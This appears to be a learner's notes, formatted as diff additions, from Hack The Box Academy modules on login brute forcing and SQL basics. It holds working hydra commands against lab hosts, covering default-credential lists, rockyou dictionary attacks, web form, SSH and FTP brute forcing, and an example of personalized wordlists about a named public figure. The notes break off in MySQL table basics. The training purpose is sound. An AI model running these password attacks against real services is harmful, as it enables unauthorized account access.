+		m1l0js@htb[/htb]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+	> We see that we get a hit right away. We can finally send another POST request using curl, as we did in the previous section, use the id value we just found, and collect the flag.
+
+-=-=-==-=
+#### Login brute forcing
+	> An example of a brute-force attack is password cracking. Passwords are usually not stored in clear text on the systems but as hash values.
+	> Here is a small list of files that can contain hashed passwords:
+		Windows		Linux
+		unattend.xml	shadow
+		sysprep.inf	shadow.bak
+		SAM		password
+	> Since the password cannot be calculated backward from the hash value, the brute force method determines the hash values belonging to the randomly selected passwords until a hash value matches the stored hash value. In this case, the password is found. This method is also called offline brute-forcing. This module will focus on online brute-forcing and explicitly deal with the websites' login forms.
+	> On most websites, there is always a login area for administrators, authors, and users somewhere. Furthermore, usernames are often recognizable on the web pages, and complex passwords are rarely used because they are difficult to remember. Therefore it is worth using the online brute forcing method after a proper enumeration if we could not identify any initial foothold.
+	> There are many tools and methods to utilize for login brute-forcing, like:
+
+    		- Ncrack
+    		- wfuzz
+    		- medusa
+    		- patator
+    		- hydra
+    		- and others.
+	> In this module, we will be mainly using hydra, as it is one of the most common and reliable tools available.
+
+* Password Attacks
+	> We found an unusual host on the network during our black box penetration test and had a closer look at it. We discovered a web server on it that is running on a non-standard port. Many web servers or individual contents on the web servers are still often used with the Basic HTTP AUTH scheme. Like in our case, we found such a webserver with such a path, which should arouse some curiosity.
+	> The HTTP specification provides two parallel authentication mechanisms:
+    		- Basic HTTP AUTH is used to authenticate the user to the HTTP server.
+    		- Proxy Server Authentication is used to authenticate the user to an intermediate proxy server.
+	> These two mechanisms work very similarly as they use requests, response status codes, and response headers. However, there are differences in the status codes and header names used.
+	> The Basic HTTP Authentication scheme uses user ID and password for authentication. The client sends a request without authentication information with its first request. The server's response contains the WWW-Authenticate header field, which requests the client to provide the credentials. This header field also defines details of how the authentication has to take place. The client is asked to submit the authentication information. In its response, the server transmits the so-called realm, a character string that tells the client who is requesting the data. The client uses the Base64 method for encoding the identifier and password. This encoded character string is transmitted to the server in the Authorization header field.
+	> As we don't have any credentials, nor do we have any other ports available, and no services or information about the webserver to be able to use or attack, the only option left is to utilize password brute-forcing.
+
+
+	> There are several types of password attacks, such as:
+		- Password Attack Type
+		- Dictionary attack
+		- Brute force
+		- Traffic interception
+		- Man In the Middle
+		- Key Logging
+		- Social engineering
+
+	> We will mainly focus on Brute Force and Dictionary Attacks. Both of these attacks will find the password by brute forcing the service.
+
+* Brute Force Attack
+	> A Brute Force Attack does not depend on a wordlist of common passwords, but it works by trying all possible character combinations for the length we specified. For example, if we specify the password's length as 4, it would test all keys from aaaa to zzzz, literally brute forcing all characters to find a working password.
+	> However, even if we only use lowercase English characters, this would have almost half a million permutations -26x26x26x26 = 456,976-, which is a huge number, even though we only have a password length of 4.
+	> Once the password length starts to increase, and we start testing for mixed casings, numbers, and special characters, the time it would take to brute force, these passwords can take millions of years.
+	> All of this shows that relying completely on brute force attacks is not ideal, and this is especially true for brute-forcing attacks that take place over the network, like in hydra.
+	> That is why we should consider methods that may increase our odds of guessing the correct password, like Dictionary Attacks.
+
+* Dictionary Attack
+	> A Dictionary Attack tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. This method is useful whenever it can be assumed that passwords with reasonable character combinations are used.
+	> Luckily, there is a huge number of passwords wordlist, consisting of the most commonly used passwords found in tests and database leaks.
+	> We can check out the SecLists repo for wordlists, as it has a huge variety of wordlists, covering many types of attacks.
+	> We can find password wordlists in our PwnBox in /opt/useful/SecLists/Passwords/, and username wordlists in /opt/useful/SecLists/Usernames/.
+
+* Methods of Brute Force Attacks
+	> There are many methodologies to carry a Login Brute Force attacks:
+		- Attack 			Description
+		- Online Brute Force Attack 	Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others
+		- Offline Brute Force Attack 	Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.
+		- Reverse Brute Force Attack 	Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service.
+		- Hybrid Brute Force Attack 	Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.
+
+* Default Passwords
+	> Default passwords are often used for user accounts for testing purposes. They are easy to remember and are also used for default accounts of services and applications intended to simplify first access. It is not uncommon for such user accounts to be overlooked or forgotten. Due to the natural laziness of man, everyone tries to make it as comfortable as possible. This, in turn, leads to inattentiveness and the resulting errors, which can harm the company's infrastructure.
+	> As we saw when we visited the website, it prompted the Basic HTTP Authentication form to input the username and password. Basic HTTP Authentication usually responses with an HTTP 401 Unauthorized response code. As we mentioned previously, we will resort to a Brute Forcing attack, as we do not have enough information to attempt a different type of attack, which we will cover in this section.
+	> As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort.
+	> It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test-, and scan all of them first.
+	> This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used.
+	> We can find a list of default password login pairs in the SecLists repository as well, specifically in the /opt/useful/SecLists/Passwords/Default-Credentials directory within Pwnbox. In this case, we will pick ftp-betterdefaultpasslist.txt as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:
+		Options 				Description
+		-C ftp-betterdefaultpasslist.txt 	Combined Credentials Wordlist
+		SERVER_IP 				Target IP
+		-s PORT 				Target Port
+		http-get 				Request Method
+		/ 					Target Path
+
+	> The assembled command results:
+		m1l0js@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+	> It's pretty common for administrators to overlook test or default accounts and their credentials. That is why it is always advised to start by scanning for default credentials, as they are very commonly left unchanged. It is even worth testing for the top 3-5 most common default credentials manually, as it can very often be found to be used.
+
+
+[+] Username Brute Force
+	> We now know the basic usage of hydra, so let us try another example of attacking HTTP basic auth by using separate wordlists for usernames and passwords.
+
+* Wordlists
+	> One of the most commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are, collected from online leaked databases of passwords and usernames. Basically, unless a password is truly unique, this wordlist will likely contain it. Rockyou.txt already exists in our Pwnbox. If we were using hydra on a local VM, we could download this wordlist from the Hashcat GitHub Repository. We can find it in the following directory:
+		/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
+	> As for our usernames wordlist, we will utilize the following wordlist from SecLists:
+		m1l0js@htb[/htb]$ locate names.txt
+			/opt/useful/SecLists/Usernames/Names/names.txt
+
+	> This is a short list of common usernames that may be found on any server.
+
+* Username/Password Attack
+	> Hydra requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:
+    		- Credentials
+    		- Target Host
+    		- Target Path
+
+	> Credentials can also be separated by usernames and passwords. We can use the -L flag for the usernames wordlist and the -P flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell hydra to stop after the first successful login by specifying the flag -f.
+	> Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
+		m1l0js@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+
+	> We see that we can still find the same working pair, but in this case, it took much longer to find them, taking nearly 30 minutes to do so. This is because while default passwords are commonly used together, they clearly are not among the top when it comes to individual wordlists. So, either the username or the password is buried deep into our wordlist, taking much longer to reach.
+
+* Username Brute Force
+	> If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the test user by adding -l test, and then adding a password word list with -P rockyou.txt.
+	> Since we already found the password in the previous section, we may statically assign it with the "-p" flag, and only brute force for usernames that might use this password.
+		m1l0js@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
+			[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
+
+
+[+] Hydra Modules
+	> Since we found a login form on the webserver for administrators during our penetration testing engagement, it is a very interesting component to which we should try to gain access without generating much network traffic. Finally, with the admin panels, we can manage servers, their services, and configurations. Many admin panels have also implemented features or elements such as the b374k shell(https://github.com/b374k/b374k) that might allow us to execute OS commands directly.
+
+* Login.php
+	> To cause as little network traffic as possible, it is recommended to try the top 10 most popular administrators' credentials, such as admin:admin.
+	> If none of these credentials grant us access, we could next resort to another widespread attack method called password spraying. This attack method is based on reusing already found, guessed, or decrypted passwords across multiple accounts. Since we have been redirected to this admin panel, the same user may have access here.
+
+* Brute Forcing Forms
+	> Hydra provides many different types of requests we can use to brute force different services. If we use hydra -h, we should be able to list supported services:
+		m1l0js@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
+
+	> In this situation there are only two types of http modules interesting for us:
+    		http[s]-{head|get|post}
+    		http[s]-post-form
+
+	> The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like .php or .aspx and others.
+	> Since the file extension is ".php" we should try the http[s]-post-form module. To decide which module we need, we have to determine whether the web application uses GET or a POST form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form.
+	> When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a POST form.
+	> Based on the URL scheme at the beginning, we can determine whether this is an HTTP or HTTPS post-form. If our target URL shows http, in this case, we should use the http-post-form module.
+	> To find out how to use the http-post-form module, we can use the "-U" flag to list the parameters it requires and examples of usage:
+
+m1l0js@htb[/htb]$ hydra http-post-form -U
+
+	> In summary, we need to provide three parameters, separated by :, as follows:
+    		- URL path, which holds the login form
+    		- POST parameters for username/password
+    		- A failed/success login string, which lets hydra recognize whether the login attempt was successful or not
+	> For the first parameter, we know the URL path is:
+		/login.php
+	> The second parameter is the POST parameters for username/passwords:
+		/login.php:[user parameter]=^USER^&[password parameter]=^PASS^
+	> The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a success string to look for.
+		/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
+
+* Fail/Success String
+	> To make it possible for hydra to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided.
+	> We can specify two different types of analysis that act as a Boolean value.
+		Type 		Boolean Value 	Flag
+		Fail 		FALSE 		F=html_content
+		Success 	TRUE 		S=html_content
+
+	> If we provide a fail string, it will keep looking until the string is not found in the response. Another way is if we provide a success string, it will keep looking until the string is found in the response.
+	> Since we cannot log in to see what response we would get if we hit a success, we can only provide a string that appears on the logged-out page to distinguish between logged-in and logged-out pages.
+	> So, let's look for a unique string so that if it is missing from the response, we must have hit a successful login. This is usually set to the error message we get upon a failed login, like Invalid Login Details. However, in this case, it is a little bit trickier, as we do not get such an error message. So is it still possible to brute force this login form?
+	> We can take a look at our login page and try to find a string that only shows in the login page, and not afterwards. For example, one distinct string is Admin Panel:
+	> So, we may be able to use Admin Panel as our fail string. However, this may lead to false-positives because if the Admin Panel also exists in the page after logging in, it will not work, as hydra will not know that it was a successful login attempt.
+	> A better strategy is to pick something from the HTML source of the login page.
+	> What we have to pick should be very unlikely to be present after logging in, like the login button or the password field. Let's pick the login button, as it is fairly safe to assume that there will be no login button after logging in, while it is possible to find something like please change your password after logging in.
+	> We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login:
+  		<form name='login' autocomplete='off' class='form' action='' method='post'>
+	> We see it in a couple of places as title/header, and we find our button in the HTML form shown above. We do not have to provide the entire string, so we will use <form name='login', which should be distinct enough and will probably not exist after a successful login.
+	> So, our syntax for the http-post-form should be as follows:
+		"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
+
+[+] Determine Login Parameters
+
+	> We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.
+
+* Using Browser
+	> One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with [CTRL + SHIFT + E].
+	> Once we do, we can simply try to login with any credentials (test:test) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data:
+
+* Another option would be to used Copy > Copy as cURL, which would copy the entire cURL command, which we can use in the Terminal to repeat the same HTTP request:
+	m1l0js@htb[/htb]$ curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
+
+* Using Burp Suite
+	> In case we were dealing with a web page that sends many HTTP requests, it may be easier to use Burp Suite in order to go through all sent HTTP requests, and pick the ones we are interested in. To do that, we will first start BurpSuite from Application Dock at the bottom in Pwnbox, skip all the messages until the application starts, and then Click on the Proxy tab:
+
+Now, all we will do is attempt a login with any username/password 'e.g. admin:admin', and go back to BurpSuite, to find the login request captured: FoxyProxy
+
+Tip: If we find another request captured, we can click "Forward" until we reach our request from "/login.php".
+
+* To use in a hydra http-post-form, we can take it as is, and replace the username/password we used admin:admin with ^USER^ and ^PASS^. The specification of our final target path should be as follows:
+	"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+[+] Login Form Attacks
+	> In our situation, we don't have any information about the existing usernames or passwords. Since we enumerated all available ports to us and we couldn't determine any useful information, we have the option to test the web application form for default credentials in combination with the http-post-form module.
+
+* Default Credentials
+	> Let's try to use the ftp-betterdefaultpasslist.txt list with the default credentials to test if one of the accounts is registered in the web application.
+		m1l0js@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+	> As we can see, we were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.
+
+* Password Wordlist
+	> Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as admin, administrator, wpadmin, root, adm, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is admin. In this case, we specify this username for our next attempt to get access to the admin panel.
+		m1l0js@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+
+[+] Personalized Wordlists
+	> To create a personalized wordlist for the user, we will need to collect some information about them. As our example here is a known public figure, we can check out their Wikipedia page or do a basic Google search to gather the necessary information. Even if this was not a known figure, we can still carry out the same attack and create a personalized wordlist for them. All we need to do is gather some information about them, which is discussed in detail in the Hashcat module, so feel free to check it out.
+
+* CUPP
+	> Many tools can create a custom password wordlist based on certain information. The tool we will be using is cupp, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with sudo apt install cupp or clone it from the Github repository(https://github.com/Mebus/cupp). Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows:
+		m1l0js@htb[/htb]$ cupp -i
+
+	> And as a result, we get our personalized password wordlist saved as william.txt.
+
+* Password Policy
+	> The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions:
+    		8 characters or longer
+    		contains special characters
+    		contains numbers
+	> So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to Hashcat or John rules, but hydra does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:
+		sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+		sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+		sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+	> We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.
+
+* Mangling
+	> It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force.
+	> Many great tools do word mangling and case permutation quickly and easily, like rsmangler(https://github.com/digininja/RSMangler) or The Mentalist(https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.
+	> As a starting point, we will stick to the wordlist we have generated so far and not perform any mangling on it. In case our wordlist does not hit a successful login, we will go back to these tools and perform some mangling to increase our chances of guessing the password.
+	> Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.
+
+* Custom Username Wordlist
+	> We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be b.gates or gates or bill, and many other potential variations. There are several methods to create the list of potential usernames, the most basic of which is simply writing it manually.
+	> One such tool we can use is Username Anarchy(https://github.com/urbanadventurer/username-anarchy)
+	> This tool has many use cases that we can take advantage of to create advanced lists of potential usernames. However, for our simply use case, we can simply run it and provide the first/last names as arguments, and forward the output into a file, as follows:
+		./username-anarchy Bill Gates > bill.txt
+	> We should finally have our username and passwords wordlists ready and we could attack the SSH server.
+
+[+] Service Authentication Brute Forcing
+
+* SSH Attack
+	> The command used to attack a login service is fairly straightforward. We simply have to provide the username/password wordlists, and add service://SERVER_IP:PORT at the end. As usual, we will add the -u -f flags. Finally, when we run the command for the first time, hydra will suggest that we add the -t 4 flag for a max number of parallel attempts, as many SSH limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows:
+		m1l0js@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+	> We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user b.gates. Now, we can attempt ssh-ing in using the credentials we got:
+		m1l0js@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22
+
+* FTP Brute Forcing
+	> Once we are in, we can check out what other users are on the system:
+		b.gates@bruteforcing:~$ ls /home
+		b.gates  m.gates
+
+	> We notice another user, m.gates. We also notice in our local recon that port 21 is open locally, indicating that an FTP must be available:
+		b.gates@bruteforcing:~$ netstat -antp | grep -i list
+
+		(No info could be read for "-p": geteuid()=1000 but you should be root.)
+		tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
+		tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+		tcp6       0      0 :::80                   :::*                    LISTEN      -                  
+
+	> Next, we can try brute forcing the FTP login for the m.gates user now.
+	> Note 1: Sometimes administrators test their security measures and policies with different tools. In this case, the administrator of this web server kept "hydra" installed. We can benefit from it and use it against the local system by attacking the FTP service locally or remotely.
+	> Note 2: "rockyou-10.txt" can be found in "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", which contains 92 passwords in total. This is a shorter version of "rockyou.txt" which includes 14,344,391 passwords.
+	> So, similarly to how we attacked the SSH service, we can perform a similar attack on FTP:
+		b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+	> We can now attempt to FTP as that user, or even switch to that user. Let us try both:
+		b.gates@bruteforcing:~$ ftp 127.0.0.1
+	> And to switch to that user:
+		b.gates@bruteforcing:~$ su - m.gates
+
+
+-=-=-=-=-=-=
+[+] SQL Injection fundamentals
+
+URLS ==> (https://www.sqlinjection.net/)
+
+* Intro to databases
+	> Before we learn about SQL injections, we need to learn more about databases and Structured Query Language (SQL), which databases will perform the necessary queries. Web applications utilize back-end databases to store various content and information related to the web application. This can be core web application assets like images and files, content like posts and updates, or user data like usernames and passwords.
+	> There are many different types of databases, each of which fits a particular type of use. Traditionally, an application used file-based databases, which was very slow with the increase in size. This led to the adoption of Database Management Systems (DBMS).
+
+* Database Management Systems
+	> A Database Management System (DBMS) helps create, define, host, and manage databases. Various kinds of DBMS were designed over time, such as file-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value stores.
+	> There are multiple ways to interact with a DBMS, such as command-line tools, graphical interfaces, or even APIs (Application Programming Interfaces). DBMS is used in various banking, finance, and education sectors to record large amounts of data. Some of the essential features of a DBMS include:
+	Feature 	Description
+	Concurrency 	A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.
+	Consistency 	With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.
+	Security 	DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.
+	Reliability 	It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.
+	Structured Query Language 	SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.
+
+* Architecture
+	> The diagram below details a two-tiered architecture => (https://academy.hackthebox.com/storage/modules/33/db_2.png)
+	> Tier I usually consists of client-side applications such as websites or GUI programs. These applications consist of high-level interactions such as user login or commenting. The data from these interactions is passed to Tier II through API calls or other requests.
+	> The second tier is the middleware, which interprets these events and puts them in a form required by the DBMS. Finally, the application layer uses specific libraries and drivers based on the type of DBMS to interact with them. The DBMS receives queries from the second tier and performs the requested operations. These operations could include insertion, retrieval, deletion, or updating of data. After processing, the DBMS returns any requested data or error codes in the event of invalid queries.
+	> It is possible to host the application server as well as the DBMS on the same host. However, databases with large amounts of data supporting many users are typically hosted separately to improve performance and scalability.
+
+[+] Types of Databases
+	> Databases, in general, are categorized into Relational Databases and Non-Relational Databases. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.
+
+* Relational Databases
+	> A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database. For example, we can imagine a company that sells products to its customers having some form of stored knowledge about where those products go, to whom, and in what quantity. However, this is often done in the back-end and without obvious informing in the front-end. Different types of relational databases can be used for each approach. For example, the first table can store and display basic customer information, the second the number of products sold and their cost, and the third table to enumerate who bought those products and with what payment data.
+	> Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed. These tables, also called entities, are all related to each other. For example, the customer information table can provide each customer with a specific ID that can indicate everything we need to know about that customer, such as an address, name, and contact information. Also, the product description table can assign a specific ID to each product. The table that stores all orders would only need to record these IDs and their quantity. Any change in these tables will affect all of them but predictably and systematically.
+	> However, when processing an integrated database, a concept is required to link one table to another using its key, called a relational database management system (RDBMS). Many companies that initially use different concepts are switching to the RDBMS concept because this concept is easy to learn, use and understand. Initially, this concept was used only by large companies. However, many types of databases now implement the RDBMS concept, such as Microsoft Access, MySQL, SQL Server, Oracle, PostgreSQL, and many others.
+	> For example, we can have a users table in a relational database containing columns like id, username, first_name, last_name, and others. The id can be used as the table key. Another table, posts, may contain posts made by all users, with columns like id, user_id, date, content, and so on.
+	> HTML Example => (https://academy.hackthebox.com/storage/modules/75/web_apps_relational_db.jpg)
+	> We can link the id from the users table to the user_id in the posts table to retrieve the user details for each post without storing all user details with each post. A table can have more than one key, as another column can be used as a key to link with another table. So, for example, the id column can be used as a key to link the posts table to another table containing comments, each of which belongs to a particular post, and so on.
+	> The relationship between tables within a database is called a Schema.
+	> This way, by using relational databases, it becomes rapid and easy to retrieve all data about a particular element from all databases. So, for example, we can retrieve all details linked to a specific user from all tables with a single query. This makes relational databases very fast and reliable for big datasets with clear structure and design and efficient data management. The most common example of relational databases is MySQL, which we will be covering in this module.
+
+* Non-relational Databases
+	> A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored. Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. Therefore, when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data. There are four common storage models for NoSQL databases:
+    		- Key-Value
+    		- Document-Based
+    		- Wide-Column
+    		- Graph
+
+	> Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and have a key for each pair, and stores all of its data as its value: HTML Example
+	> The above example can be represented using JSON as:
+
+		{
+		  "100001": {
+		    "date": "01-01-2021",
+		    "content": "Welcome to this web application."
+		  },
+		  "100002": {
+		    "date": "02-01-2021",
+		    "content": "This is the first post on this web app."
+		  },
+		  "100003": {
+		    "date": "02-01-2021",
+		    "content": "Reminder: Tomorrow is the ..."
+		  }
+		}
+
+	> It looks similar to a dictionary item in languages like Python or PHP (i.e. {'key':'value'}), where the key is usually a string, and the value can be a string, dictionary, or any class object.
+	> The most common example of a NoSQL database is MongoDB.
+	> Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.
+
+[+] Intro to MySQL
+	> This module introduces SQL injection through MySQL, and it is crucial to learn more about MySQL and SQL to understand how SQL injections work and utilize them properly. Therefore, this section will cover some of MySQL/SQL's basics and syntax and examples used within MySQL/MariaDB databases.
+
+* Structured Query Language (SQL)
+	> SQL syntax can differ from one RDBMS to another. However, they are all required to follow the ISO standard for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:
+    		- Retrieve data
+    		- Update data
+    		- Delete data
+    		- Create new tables and databases
+    		- Add / remove users
+    		- Assign permissions to these users
+* Command Line
+	> The mysql utility is used to authenticate to and interact with a MySQL/MariaDB database. The -u flag is used to supply the username and the -p flag for the password. The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
+		m1l0js@htb[/htb]$ mysql -u root -p
+	> Again, it is also possible to use the password directly in the command, though this should be avoided, as it could lead to the password being kept in logs and terminal history:
+		m1l0js@htb[/htb]$ mysql -u root -p<password>
+	> Tip: There shouldn't be any spaces between '-p' and the password.
+	> The examples above log us in as the superuser, i.e.,"root" with the password "password," to have privileges to execute all commands. Other DBMS users would have certain privileges to which statements they can execute. We can view which privileges we have using the SHOW GRANTS command be discussed later.
+	> When we do not specify a host, it will default to the localhost server. We can specify a remote host and port using the -h and -P flags.
+		m1l0js@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 
+	> Note: The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.
+	> Note: To follow along with the examples, try to use the 'mysql' tool on your PwnBox to log in to the DBMS found in the question at the end of the section, using its IP and port. Use 'root' for the username and 'password' for the password.
+
+* Creating a database
+	> Once we log in to the database using the mysql utility, we can start using SQL queries to interact with the DBMS. For example, a new database can be created within the MySQL DBMS using the CREATE DATABASE statement.
+		mysql> CREATE DATABASE users;
+	> MySQL expects command-line queries to be terminated with a semi-colon. The example above created a new database named users. We can view the list of databases with SHOW DATABASES, and we can switch to the users database with the USE statement:
+		mysql> SHOW DATABASES;
+		mysql> USE users;
+	> SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.
+
+* Tables
+	> DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns. The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type.
+	> A data type defines what kind of value is to be held by a column. Common examples are numbers, strings, date, time, and binary data. There could be data types specific to DBMS as well. A complete list of data types in MySQL can be found here(https://dev.mysql.com/doc/refman/8.0/en/data-types.html). For example, let us create a table named logins to store user data, using the CREATE TABLE SQL query:
+	> As we can see, the CREATE TABLE query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated. After the name and type, we can specify specific properties, as will be discussed later.
+		mysql> CREATE TABLE logins (
+		    ->     id INT,
+		    ->     username VARCHAR(100),
+		    ->     password VARCHAR(100),
+		    ->     date_of_joining DATETIME
+		    ->     );
+
+	> The SQL queries above create a table named logins with four columns. The first column, id is an integer. The following two columns, username and password are set to strings of 100 characters each. Any input longer than this will result in an error. The date_of_joining column of type DATETIME stores the date when an entry was added.
+
+mysql> SHOW TABLES;
+
++-----------------+
+| Tables_in_users |
++-----------------+
+| logins          |
++-----------------+
+1 row in set (0.00 sec)
+
+A list of tables in the current database can be obtained using the SHOW TABLES statement. In addition, the DESCRIBE keyword is used to list the table structure with its fields and data types.
+
+mysql> DESCRIBE logins;
+
++-----------------+--------------+
+| Field           | Type         |
++-----------------+--------------+
+| id              | int          |
+| username        | varchar(100) |
+| password        | varchar(100) |
+| date_of_joining | date         |
++-----------------+--------------+
+4 rows in set (0.00 sec)
+
+Table Properties
+
+Within the CREATE TABLE query, there are many properties(https://dev.mysql.com/doc/refman/8.0/en/create-table.html) that can be set for the table and each column. For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:
+Code: sql
+
+    id INT NOT NULL AUTO_INCREMENT,
+
+The NOT NULL constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the UNIQUE constraint to ensures that the inserted item are always unique. For example, if we use it with the username column, we can ensure that no two users will have the same username:
+Code: sql
+
+    username VARCHAR(100) UNIQUE NOT NULL,
+
+Another important keyword is the DEFAULT keyword, which is used to specify the default value. For example, within the date_of_joining column, we can set the default value to Now(), which in MySQL returns the current date and time:
+Code: sql
+
